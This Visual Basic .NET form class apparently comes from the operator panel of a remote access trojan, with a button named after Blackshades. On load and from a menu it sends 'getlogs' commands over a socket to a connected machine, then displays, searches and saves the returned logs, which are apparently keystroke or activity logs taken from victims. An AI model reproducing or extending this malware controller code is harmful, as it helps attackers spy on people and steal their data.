Public Class Form27
    Public sock As Integer

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        Form1.s.Send(sock, "getlogs")
    End Sub

    Private Sub SaveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Dim x As New SaveFileDialog
        With x
            .Filter = "TXT|*.txt"

        End With

        If x.ShowDialog = Windows.Forms.DialogResult.OK Then
            FileOpen(1, x.FileName, OpenMode.Binary)
            FilePut(1, TextBox1.Text)
            FileClose(1)
            MsgBox("Logs Saved", MsgBoxStyle.Information, "")
        End If


    End Sub
    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        If TextBox1.Text.Contains(TextBox2.Text) = True Then
            Dim x As Integer = TextBox1.Text.IndexOf(TextBox2.Text, TextBox1.Text.IndexOf(TextBox2.Text))
            Dim y As Integer = TextBox2.Text.Length
            TextBox1.Select(x, y)
            TextBox1.SelectionColor = Color.Red
            TextBox1.SelectionFont = New Font(TextBox1.Font, FontStyle.Bold)
        Else
            MsgBox("Cannot Find This Word : " & " " & TextBox2.Text)
            TextBox2.Text = ""

        End If
    End Sub

    Private Sub Form27_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Form1.s.Send(sock, "getlogs")
        Form1.s.Send(sock, "getlog")
    End Sub
End Class